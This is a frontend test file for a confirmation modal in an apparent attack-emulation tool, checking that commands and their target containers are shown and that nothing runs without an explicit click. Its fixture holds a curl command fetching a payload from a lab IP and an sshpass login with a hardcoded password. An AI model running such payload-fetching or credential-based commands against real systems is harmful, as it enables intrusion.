import { describe, expect, it, vi, beforeEach } from "vitest"
import { screen, waitFor } from "@testing-library/react"
import userEvent from "@testing-library/user-event"

import { renderWithI18n } from "@/test/render"
import { EmulationConfirmModal } from "@/components/EmulationConfirmModal"
import type { EmulacaoPreview, EmulacaoResultado } from "@/lib/emulacao"

// Mock the emulation API wrappers; keep classifyEmulacaoError real.
vi.mock("@/lib/emulacao", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@/lib/emulacao")>()
  return {
    ...actual,
    getEmulacaoPreview: vi.fn(),
    runEmulacao: vi.fn(),
  }
})

import { getEmulacaoPreview, runEmulacao } from "@/lib/emulacao"

const getPreviewMock = vi.mocked(getEmulacaoPreview)
const runMock = vi.mocked(runEmulacao)

/** A preview with two concrete commands, each with a target container. */
function makePreview(): EmulacaoPreview {
  return {
    caso_id: "c0026",
    tem_externo: false,
    abilities: [
      {
        ability_id: "ab-1",
        ability_name: "Ingress Tool Transfer",
        tem_externo: false,
        comandos: [
          {
            comando: "curl http://192.168.10.5/payload -o /tmp/p",
            local: false,
            tem_externo: false,
            alvos: ["victim-01"],
            destinos: [
              {
                valor: "192.168.10.5",
                origem: "curl",
                externo: false,
                container: "victim-01",
                alvo: "victim-01",
              },
            ],
          },
          {
            comando: "sshpass -p pw ssh red@192.168.20.30 'whoami'",
            local: false,
            tem_externo: false,
            alvos: ["attacker-kali"],
            destinos: [
              {
                valor: "192.168.20.30",
                origem: "ssh",
                externo: false,
                container: "attacker-kali",
                alvo: "attacker-kali",
              },
            ],
          },
        ],
      },
    ],
  }
}

function makeResult(): EmulacaoResultado {
  return {
    iniciada: true,
    resultado: "ok",
    estado: "em_execucao",
    operacao_id: "op-1",
    total_sucesso: 0,
    total_falha: 0,
    resultados: [],
    mensagem: "Emulação iniciada.",
  }
}

describe("EmulationConfirmModal (Req. 6.5 — shows commands + targets before confirmation)", () => {
  beforeEach(() => {
    getPreviewMock.mockReset()
    runMock.mockReset()
  })

  it("displays every concrete command and its target container before any confirmation", async () => {
    getPreviewMock.mockResolvedValue(makePreview())

    renderWithI18n(
      <EmulationConfirmModal casoId="c0026" open onClose={vi.fn()} />,
    )

    // Preview is fetched on open, without running anything.
    await waitFor(() => {
      expect(getPreviewMock).toHaveBeenCalledWith("c0026")
    })

    // The concrete commands render verbatim.
    await screen.findByText("curl http://192.168.10.5/payload -o /tmp/p")
    expect(
      screen.getByText("sshpass -p pw ssh red@192.168.20.30 'whoami'"),
    ).toBeInTheDocument()

    // The target containers of each command render.
    expect(screen.getByText("victim-01")).toBeInTheDocument()
    expect(screen.getByText("attacker-kali")).toBeInTheDocument()

    // The "target container" label is shown (Req. 6.5).
    expect(screen.getAllByText(/Container de destino/).length).toBeGreaterThanOrEqual(1)

    // Nothing was executed just by opening / rendering the preview (Req. 6.6).
    expect(runMock).not.toHaveBeenCalled()
  })

  it("only runs on an explicit confirm click (no auto-run)", async () => {
    getPreviewMock.mockResolvedValue(makePreview())
    runMock.mockResolvedValue(makeResult())
    const user = userEvent.setup()

    renderWithI18n(
      <EmulationConfirmModal casoId="c0026" open onClose={vi.fn()} />,
    )

    await screen.findByText("curl http://192.168.10.5/payload -o /tmp/p")

    // Still not executed until the explicit control is clicked.
    expect(runMock).not.toHaveBeenCalled()

    const confirm = screen.getByRole("button", { name: "Confirmar execução" })
    expect(confirm).toBeEnabled()

    await user.click(confirm)

    await waitFor(() => {
      expect(runMock).toHaveBeenCalledWith("c0026", true)
    })
  })

  it("cancel returns to the prior state without executing anything (Req. 6.7)", async () => {
    getPreviewMock.mockResolvedValue(makePreview())
    runMock.mockResolvedValue(makeResult())
    const onClose = vi.fn()
    const user = userEvent.setup()

    renderWithI18n(
      <EmulationConfirmModal casoId="c0026" open onClose={onClose} />,
    )

    await screen.findByText("curl http://192.168.10.5/payload -o /tmp/p")

    const cancel = screen.getByRole("button", { name: "Cancelar" })
    await user.click(cancel)

    expect(onClose).toHaveBeenCalledTimes(1)
    expect(runMock).not.toHaveBeenCalled()
  })
})
